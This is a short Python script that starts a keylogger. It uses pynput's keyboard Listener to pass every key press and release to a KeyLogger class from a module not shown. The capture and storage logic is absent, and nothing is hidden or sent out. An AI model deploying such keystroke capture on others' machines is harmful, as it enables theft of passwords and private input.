from pynput.keyboard import Listener

from key_logger import KeyLogger

kl = KeyLogger()

with Listener(on_press=kl.key_logger, on_release=kl.exit_logger) as listener:
    listener.join()

kl.success()